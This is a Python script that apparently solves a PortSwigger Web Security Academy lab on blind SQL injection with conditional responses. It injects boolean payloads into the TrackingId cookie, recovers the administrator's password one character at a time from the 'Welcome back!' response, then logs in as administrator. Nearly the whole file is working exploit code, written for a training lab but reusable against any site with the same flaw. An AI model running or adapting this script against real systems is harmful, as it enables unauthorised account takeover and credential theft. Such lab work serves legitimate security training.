import requests
from urllib3.exceptions import InsecureRequestWarning
from time import sleep
from bs4 import BeautifulSoup
import string

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# lab_url: https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses
# db: MySQL
# author: 0xyf


class SQLi11:
    def __init__(self):
        self.lab_id = "0a7f00500446fb048003122400c300bd"
        self.url = f"https://{self.lab_id}.web-security-academy.net"
        self.login_url = f"{self.url}/login"
        self.vuln_url = f"{self.url}/filter"
        self.proxies = {"https": "http://127.0.0.1:8080"}
        self.username = "administrator"

    def get_csrf_token(self):
        r = requests.get(f"{self.login_url}")
        soup = BeautifulSoup(r.text, "html.parser")
        self.csrf_token = soup.find("input", attrs={"name": "csrf"})["value"]
        self.cookies = r.cookies
        # self.cookies = {**self.cookies **r.cookies} # Combine the existing cookies with the new cookie

    def execute_request(self, payload):
        cookies = {"TrackingId": payload}
        r = requests.get(self.url, proxies=self.proxies, cookies=cookies, verify=False)
        return r

    def get_pw_len(self):
        for i in range(1, 1001):  # Restrict range to a reasonable limit
            print(f"Trying password length: {i}")
            payload = f"' OR 1=1 AND LENGTH((SELECT password FROM users WHERE username = 'administrator')) = {i}--"
            r = self.execute_request(payload)
            if "Welcome back!" in r.text:
                print(f"Password length found: {i}")
                self.pw_len = i
                return
        raise ValueError("Password length not found.")

    def get_pw(self):
        password = ""
        valid_chars = string.ascii_lowercase + string.digits  # Characters to test

        for i in range(1, self.pw_len + 1):
            for char in valid_chars:
                print(f"Trying: {password + char}")
                payload = f"' OR 1=1 AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), {i}, 1) = '{char}'--"
                r = self.execute_request(payload)
                if "Welcome back!" in r.text:
                    password += char
                    break
        self.password = password

    def login(self):
        self.get_csrf_token()
        print(f"[*] Attempting to Login as {self.username}:{self.password}")
        data = {
            "username": self.username,
            "password": self.password,
            "csrf": self.csrf_token,
        }
        r = requests.post(
            self.login_url,
            cookies=self.cookies,
            data=data,
            proxies=self.proxies,
            verify=False,
        )

    def check_solved(self):
        sleep(2)
        r = requests.get(self.url)
        if "Congratulations, you solved the lab!" in r.text:
            print("Lab Solved")
        else:
            print("Did not solve lab, check payload")

    def solve(self):
        self.get_pw_len()
        self.get_pw()
        self.login()
        self.check_solved()


def main():
    SQLi11().solve()


if __name__ == "__main__":
    main()
